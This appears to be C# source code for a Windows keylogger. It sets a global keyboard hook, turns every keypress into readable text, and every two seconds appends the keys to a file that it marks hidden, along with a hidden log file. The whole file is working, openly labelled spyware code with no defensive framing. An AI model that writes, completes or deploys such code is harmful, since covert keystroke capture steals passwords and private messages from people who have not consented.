using System;
using System.IO;
using System.Timers;
using System.Windows.Forms;
using System.Security.Principal;

namespace Keylogger
{
    public partial class Keylogger : Form
    {
        private string logFileName = "log.txt";
        private string resultTextFileName = "temp.txt";
        private string linesBuffer;
        private int intervalsTimeInMiliSecs = 2000;
        private GlobalKeyboardHook keyListener;

        public Keylogger()
        {
            try
            {
                createAndSetLogFile();
                File.AppendAllText(logFileName, "Checkpoint: App starts.");
                addEmptyLineToFile(logFileName);
                createAndSetTextFile();
                File.AppendAllText(logFileName, "Checkpoint: Result text file has been created successfully.");
                addEmptyLineToFile(logFileName);
                setKeyListener();
                setTimer();
                File.AppendAllText(logFileName, "Checkpoint: Listener and timer set successfully!");
                addEmptyLineToFile(logFileName);
            }
            catch (Exception e)
            {
                File.AppendAllText(logFileName, "An error has ocurred: ");
                addEmptyLineToFile(logFileName);
                addEmptyLineToFile(logFileName);
                File.AppendAllText(logFileName, e.StackTrace);
                addEmptyLineToFile(logFileName);
                addEmptyLineToFile(logFileName);
                File.AppendAllText(logFileName, e.Message);
            }
        }

        private void createAndSetLogFile()
        {
            createFile(logFileName);
            hideFile(logFileName);
        }

        private void createFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
            }
            var newFile = File.Create(filePath);
            newFile.Close();
        }

        private void hideFile(string filePath)
        {
            File.SetAttributes(filePath, FileAttributes.Hidden);
        }

        private string getCurrentUserName()
        {
            return WindowsIdentity.GetCurrent().Name;
        }

        private void addEmptyLineToFile(string filePath)
        {
            File.AppendAllText(filePath, Environment.NewLine);
        }

        private void createAndSetTextFile()
        {
            createFile(resultTextFileName);
            writeCurrentInputLanguageInTextFile();
            hideFile(resultTextFileName);
        }

        private void writeCurrentInputLanguageInTextFile()
        {
            File.AppendAllText(resultTextFileName, InputLanguage.CurrentInputLanguage.LayoutName);
            File.AppendAllText(resultTextFileName, " ");
            File.AppendAllText(resultTextFileName, InputLanguage.CurrentInputLanguage.Culture.Name);
            addEmptyLineToFile(resultTextFileName);
            addEmptyLineToFile(resultTextFileName);
        }

        private void setKeyListener()
        {
            File.AppendAllText(logFileName, "We re about to set GlobalKeyboardHook now...");
            addEmptyLineToFile(logFileName);
            keyListener = new GlobalKeyboardHook(logFileName);
            keyListener.KeyDown += onKeyDown;
            File.AppendAllText(logFileName, "GlobalKeyboardHook and its event is set successfully!");
            addEmptyLineToFile(logFileName);
        }

        private void onKeyDown(object sender, KeyEventArgs e)
        {
            File.AppendAllText(logFileName, "Attention! onKeyDown event has been triggered!");
            addEmptyLineToFile(logFileName);
            string keyPressed = string.Format("{0}", e.KeyCode);
            keyPressed = KeyCodesTranslator.TranslateKeyCodesIntoLegibleText(keyPressed);
            linesBuffer = linesBuffer + keyPressed;
        }

        private void setTimer()
        {
            System.Timers.Timer timer = new System.Timers.Timer(intervalsTimeInMiliSecs);
            timer.Elapsed += saveLines;
            timer.AutoReset = true;
            timer.Start();
        }

        private void saveLines(object source, ElapsedEventArgs e)
        {
            File.AppendAllText(resultTextFileName, linesBuffer);
            clearBuffer();
        }

        private void clearBuffer()
        {
            linesBuffer = "";
        }
    }
}
